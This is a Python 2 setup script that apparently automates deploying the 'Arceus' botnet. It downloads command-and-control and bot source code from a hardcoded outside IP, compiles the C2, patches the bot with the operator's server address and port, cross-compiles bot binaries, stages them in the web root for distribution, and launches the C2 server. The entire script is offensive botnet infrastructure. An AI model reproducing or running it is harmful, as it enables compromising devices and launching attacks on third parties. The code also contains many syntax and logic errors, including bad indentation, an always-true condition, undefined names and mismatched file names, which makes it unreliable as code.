# Arceus I AutoSetup || By FlexingOnLamers / Georgia Cri
import subprocess, time

def cri(cmd):
    subprocess.call(cmd, shell=True)
def jack(file_name, line_num, text):
  lines = open(file_name, 'r').readlines()
  lines[line_num] = text
  out = open(file_name, 'w')
  out.writelines(lines)
  out.close()

Arceus = "http://98.143.148.177"


print("Arceus I AutoSetup By GeorgiaCri")

ip = raw_input("Server IP:")
Username = raw_input("Username:")
Password = raw_input("Password:")
CPort = raw_input("C2 Port:")
thread = raw_input("Desired Threads:")
BPort = raw_input("Botport:")
Bin = raw_input("Bin Names:")


print("Creating admin account for user:["+ Username +"]")
cri('echo '+ Username +' '+ Password +' admin >> arceus.txt')
time.sleep(2)
print("Finished!")
print("Downloading Arceus C2..")
cri("wget -q "+ Arceus +"/arc/c2.c -O arceus.c")
time.sleep(2)
print("Finished!")
print("Compiling Arceus C2..")
cri('gcc -o arceus arceus.c -pthread')
time.sleep(2)
print("Finished!")
rm = raw_input("Would you like to delete the original .c file for arceus c2? (y/n):")
if rm == "y" or "Y":
cri("rm -rf arceus.c")
elif rm == "n" or "N":
print("Continuing..")
Print("Downloading Arceus Bot..")
cri("wget -q "+ Arceus +"/arc/bot.c -O bot.c")
time.sleep(2)
print("Finished!")
print("Downloading Cross-compiler..")
cri('wget -q '+ Arceus +'/arc/arceus.py')
time.sleep(2)
print("Finished!")
cri('clear')
print("Changing information inside of the arceus client with user input..")
jack('bot.c' 178, 'unsigned char *Arceus[] = {"'+ ip +':'+ BPort +'"};')
print("Compiling Bot..")
cri("python arceus.py client.c "+ ip +"")
cri('clear')
time.sleep(2)
print("Finished!")
print("Moving Cross-Compilers to Directory:[/root/Cross-Compilers]")
cri('mkdir Cross-Compilers && mv cross-compiler-* /root/Cross-Compilers')
time.sleep(2)
print("Finished!")

print("Changing Bin names with user input..")
cri('cd /var/www/html/ && cat bins.sh >> '+ Bin +'; rm -rf bins.sh')
time.sleep(2)
print("Finished!")

cri('screen -s ./arceus '+ BPort +' '+ Thread +' '+ CPort +'')

print("AutoSetup Finished!")